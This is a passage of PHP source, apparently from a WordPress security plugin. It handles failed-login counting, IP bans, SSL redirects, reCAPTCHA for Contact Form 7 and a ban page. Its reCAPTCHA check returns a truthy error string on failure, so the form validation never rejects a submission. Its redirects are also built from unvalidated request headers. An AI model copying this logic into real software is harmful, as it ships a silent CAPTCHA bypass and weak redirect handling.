                $data['loginfail'] = 1;
            $wpdb->insert('wp_tr_lock_ip', $data);
        }
        return $data;
    }

    function add_count_user($userid, $loginfail = 0, $time = 0, $ip = '', $sent_mail = 0)
    {
        $log['login_failed'] = $loginfail;
        $log['login_failed_time'] = $time;
        $log['ip'] = $ip;
        $log['sent_mail'] = $sent_mail;
        update_user_meta($userid, '_tr_security', $log);
    }

    function allow_user_login($user)
    {
        $this->add_count_user($user->ID);
    }

    function updatebantime($time, $ip)
    {
        global $wpdb;
        $data = array('bantime' => $time);
        $where = array('ip' => $ip);
        if ($ip == 'all') {
            unset($where['ip']);
        }

        $rs = $wpdb->update('wp_tr_lock_ip', $data, $where);
        if ($rs == false && !empty($where['ip'])) {
            $wpdb->insert('wp_tr_lock_ip', array('ip' => $ip, 'bantime' => $time));
        }
    }

    function reset_count_ip($ip)
    {
        global $wpdb;
        $exists = $wpdb->get_row($wpdb->prepare("SELECT * FROM wp_tr_lock_ip WHERE ip = %s", $ip));

        if ($exists) {
            $wpdb->update('wp_tr_lock_ip', array('loginfail' => 0, 'cookiefail' => 0), array('ip' => $ip));
            $_SESSION['tr_secu_reset_ip'] = $ip;
        }
    }

    function use_ssl($ssl = false)
    {
        //return if post method
        if (is_array($_POST) && count($_POST) > 0)
            return;
        if (defined('DOING_CRON') && DOING_CRON) {
            return;
        }

        if ($ssl && !$this->is_ssl()) {
            if (0 === strpos($_SERVER['REQUEST_URI'], 'http')) {
                header('location:' . preg_replace('|^http://|', 'https://', $_SERVER['REQUEST_URI']));
            } else {
                header('location:' . 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
            }
            exit;
        } else
            if (!$ssl && $this->is_ssl()) {
            if (0 === strpos($_SERVER['REQUEST_URI'], 'http')) {
                header('location:' . preg_replace('|^https://|', 'http://', $_SERVER['REQUEST_URI']));
            } else {
                header('location:' . 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
            }
            exit;
        }
    }

    public function fix_ssl($content)
    {
        $content = str_replace('http://', '//', $content);
        $content = str_replace('http:\/\/', '\/\/', $content);
        return $content;
    }

    function is_ssl()
    {
        return (is_ssl() || (isset($_SERVER['HTTP_CF_VISITOR']) && stripos($_SERVER['HTTP_CF_VISITOR'], 'https') > 0));
    }

    function wpcf7_add_form_tag_captcha()
    {
        if (!function_exists('wpcf7_add_form_tag')) return;

        wpcf7_add_form_tag(
            'captchac',
            array(&$this, 'show_recaptcha'),
            array('name-attr' => true)
        );

        // CAPTCHA-Response (input)
        wpcf7_add_form_tag(
            'captchar',
            array(&$this, 'wpcf7_captchar_form_tag_handler'),
            array(
                'name-attr' => true,
                'do-not-store' => true,
            )
        );
    }

    function show_recaptcha($tag = null, $theme = 'light', $size = 'normal')
    {
        if (defined('TR_DISABLE_CAPTCHA')) return;

        if (is_object($tag)) {
            if ($tag->has_option('dark')) {
                $theme = 'dark';
            }
            if ($tag->has_option('compact')) {
                $size = 'compact';
            }
        } else {
            $key = $tag;
        }

        if (empty($key)) {
            $key = $this->options['google_key'];
        }
        $version = isset($this->options['google_version']) ? trim($this->options['google_version']) : '2';
        if ($version === '3') {
            $html  = "<script src='https://www.google.com/recaptcha/api.js?render={$key}'></script>\n";
            $html .= "<input type='hidden' name='g-recaptcha-response' id='g-recaptcha-response'>\n";
            $html .= "<script>
            (function () {

                function bindRecaptcha(form) {
                    if (!form || form.dataset.recaptchaBound) return;
                    if (typeof grecaptcha === 'undefined') return;

                    form.dataset.recaptchaBound = '1';

                    var input = form.querySelector('#g-recaptcha-response');
                    if (!input) {
                        input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = 'g-recaptcha-response';
                        input.id   = 'g-recaptcha-response';
                        form.appendChild(input);
                    }

                    form.addEventListener('submit', function (e) {
                        if (form.dataset.recaptchaSubmitting) return;

                        e.preventDefault();
                        form.dataset.recaptchaSubmitting = '1';

                        grecaptcha.ready(function () {
                            grecaptcha.execute('{$key}', { action: 'submit' })
                                .then(function (token) {
                                    input.value = token;
                                    form.submit();
                                })
                                .catch(function () {
                                    delete form.dataset.recaptchaSubmitting;
                                });
                        });
                    });
                }

                function init() {
                    // normal login
                    bindRecaptcha(document.querySelector('form'));

                    // wp-auth-check iframe
                    var iframe = document.getElementById('wp-auth-check-frame');
                    if (iframe && iframe.contentWindow) {
                        try {
                            bindRecaptcha(
                                iframe.contentWindow.document.querySelector('form')
                            );
                        } catch (e) {}
                    }
                }

                setInterval(init, 500);

            })();
            </script>";
        } else {
            $html  = "<script src='https://www.google.com/recaptcha/api.js' async defer></script>\n";
            $html .= "<div class='g-recaptcha' style='transform: scale(0.89);transform-origin: 0 0;' data-sitekey='{$key}' data-theme='{$theme}' data-size='{$size}'></div>\n";
        }
        return $html;
    }

    function recaptcha_valid($secret = null)
    {
        if ($secret == null) $secret = $this->options['google_secret'];
        $post_data = http_build_query(
            array(
                'secret' => $secret,
                'response' => $_POST['g-recaptcha-response'],
                'remoteip' => $_SERVER['REMOTE_ADDR']
            )
        );
        $opts = array(
            'http' =>
            array(
                'method'  => 'POST',
                'header'  => 'Content-type: application/x-www-form-urlencoded',
                'content' => $post_data
            )
        );
        $context  = stream_context_create($opts);
        $response = file_get_contents('https://www.google.com/recaptcha/api/siteverify', false, $context);
        $rs = @json_decode($response);
        if ($rs->success) return $rs->success;
        return 'Failed to verify you are human. Please try again.';
    }
    function wpcf7_captchar_form_tag_handler($tag)
    {
        if (defined('TR_DISABLE_CAPTCHA')) return;

        $validation_error = '';
        $class = wpcf7_form_controls_class($tag->type);

        if ($validation_error) {
            $class .= ' wpcf7-not-valid';
        }
        $atts['name'] = $tag->name;
        $atts['class'] = $tag->get_class_option($class);
        $atts['id'] = $tag->get_id_option();
        $atts['tabindex'] = $tag->get_option('tabindex', 'signed_int', true);
        $atts['autocomplete'] = 'off';
        $atts['aria-invalid'] = $validation_error ? 'true' : 'false';
        $atts = wpcf7_format_atts($atts);
        $html = sprintf(
            '<span class="wpcf7-form-control-wrap %1$s"><input type="hidden" %2$s />%3$s</span>',
            sanitize_html_class($tag->name),
            $atts,
            $validation_error
        );

        return $html;
    }

    function wpcf7_captcha_validation_filter($result, $tag)
    {
        if (!$this->recaptcha_valid() && !defined('TR_DISABLE_CAPTCHA')) {
            $result->invalidate($tag, 'You must validate reCaptcha');
        }
        return $result;
    }



    public function show_ban($ip = '', $type = '')
    {
        if (! defined('DONOTCACHEPAGE')) {
            define('DONOTCACHEPAGE', true);
        }

        if ($_SERVER['REQUEST_METHOD'] == 'GET') {
            @session_unset();
            @session_destroy();


            if (defined('SECURE_AUTH_COOKIE')) {
                setcookie(SECURE_AUTH_COOKIE, '', time() - 1000);
                setcookie(SECURE_AUTH_COOKIE, '', time() - 1000, '/');
            }

            if (defined('AUTH_COOKIE')) {
                setcookie(AUTH_COOKIE, '', time() - 1000);
                setcookie(AUTH_COOKIE, '', time() - 1000, '/');
            }

            if (defined('LOGGED_IN_COOKIE')) {
                setcookie(LOGGED_IN_COOKIE, '', time() - 1000);
                setcookie(LOGGED_IN_COOKIE, '', time() - 1000, '/');
            }
        }
        require(TRSCSC_PATH . "pages/ban.php");
        exit;
    }
}
